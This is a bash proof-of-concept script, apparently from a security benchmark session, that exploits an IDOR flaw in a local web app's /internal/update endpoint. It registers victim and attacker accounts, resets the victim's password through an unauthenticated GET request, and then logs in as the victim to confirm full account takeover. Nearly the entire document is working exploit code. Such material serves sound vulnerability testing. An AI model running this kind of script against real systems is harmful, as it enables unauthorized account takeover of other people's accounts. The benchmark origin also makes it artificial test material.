#!/bin/bash
# POC: Demonstrates horizontal privilege escalation via IDOR on /internal/update endpoint - shows that any user can reset any other user's password without authorization checks
# Target: ./repo
# Created: 2025-11-04T19:40:09.212Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# IDOR Horizontal Privilege Escalation POC - /internal/update endpoint
# Demonstrates that any authenticated user with localhost access can reset ANY user's password
# without proper authorization checks

set -e

TARGET="http://localhost:5000"
TIMESTAMP=$(date +%s%N)

echo "[*] IDOR Vulnerability POC: Horizontal Privilege Escalation on /internal/update"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Create first test user (legitimate user)
echo "[+] Step 1: Creating legitimate user (victim_user)"
VICTIM_USER="victim_user_$TIMESTAMP"
VICTIM_PASS="original_password_123"

REGISTER_RESPONSE=$(curl -s -X POST "$TARGET/register" \
  -d "username=$VICTIM_USER&password=$VICTIM_PASS&first_name=Victim&last_name=User&email=victim@example.com")

if echo "$REGISTER_RESPONSE" | grep -q "Redirecting"; then
  echo "    [✓] Victim user created: $VICTIM_USER"
else
  echo "    [!] Warning: Unexpected response from register endpoint"
fi

# Step 2: Create attacker user (or just use localhost access)
echo ""
echo "[+] Step 2: Creating attacker user (attacker_user)"
ATTACKER_USER="attacker_user_$TIMESTAMP"
ATTACKER_PASS="attacker_password_123"

REGISTER_RESPONSE=$(curl -s -X POST "$TARGET/register" \
  -d "username=$ATTACKER_USER&password=$ATTACKER_PASS&first_name=Attacker&last_name=User&email=attacker@example.com")

if echo "$REGISTER_RESPONSE" | grep -q "Redirecting"; then
  echo "    [✓] Attacker user created: $ATTACKER_USER"
else
  echo "    [!] Warning: Unexpected response from register endpoint"
fi

# Step 3: Authenticate attacker user
echo ""
echo "[+] Step 3: Logging in as attacker user"
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies_$$.txt -X POST "$TARGET/login" \
  -d "username=$ATTACKER_USER&password=$ATTACKER_PASS")

if echo "$LOGIN_RESPONSE" | grep -q "Redirecting"; then
  echo "    [✓] Attacker user logged in successfully"
else
  echo "    [!] Warning: Unexpected login response"
fi

# Step 4: Exploit IDOR - Reset victim's password without authorization
echo ""
echo "[+] Step 4: EXPLOITING IDOR - Attempting to reset victim user's password"
echo "    [*] Making request to /internal/update with:"
echo "        - Target user: $VICTIM_USER"
echo "        - New password: hacked_password_666"

EXPLOIT_RESPONSE=$(curl -s "http://127.0.0.1:5000/internal/update?username=$VICTIM_USER&newpassword=hacked_password_666")

echo "    [*] Response: $EXPLOIT_RESPONSE"

if echo "$EXPLOIT_RESPONSE" | grep -q "successfully"; then
  echo "    [✓] PASSWORD RESET SUCCESSFUL - IDOR VULNERABILITY CONFIRMED!"
else
  echo "    [!] Unexpected response - checking if password was changed anyway"
fi

# Step 5: Verify the vulnerability by attempting to login as victim with new password
echo ""
echo "[+] Step 5: Verifying compromise - attempting to login as victim with new password"

LOGIN_TEST=$(curl -s -c /tmp/cookies_victim_$$.txt -X POST "$TARGET/login" \
  -d "username=$VICTIM_USER&password=hacked_password_666")

if echo "$LOGIN_TEST" | grep -q "Redirecting"; then
  echo "    [✓✓✓] CRITICAL: Successfully logged in as victim user with compromised password!"
  echo "    [✓✓✓] IDOR VULNERABILITY FULLY CONFIRMED - ACCOUNT TAKEOVER POSSIBLE"
else
  echo "    [!] Could not verify login with new password"
  echo "    [*] Full response: $LOGIN_TEST"
fi

# Step 6: Demonstrate the flaw - no authorization checks
echo ""
echo "[+] Step 6: Summary of Vulnerability"
echo "    =================================================================================="
echo "    The /internal/update endpoint lacks authorization checks:"
echo "    1. No verification that the calling user owns the target account"
echo "    2. Any user can specify ANY username parameter"
echo "    3. Password is reset without checking user permissions"
echo "    4. Result: Horizontal privilege escalation (IDOR)"
echo "    5. Impact: Complete account takeover of any user"
echo "    =================================================================================="

# Cleanup
rm -f /tmp/cookies_$$.txt /tmp/cookies_victim_$$.txt

echo ""
echo "[+] POC Completed Successfully - Vulnerability Confirmed!"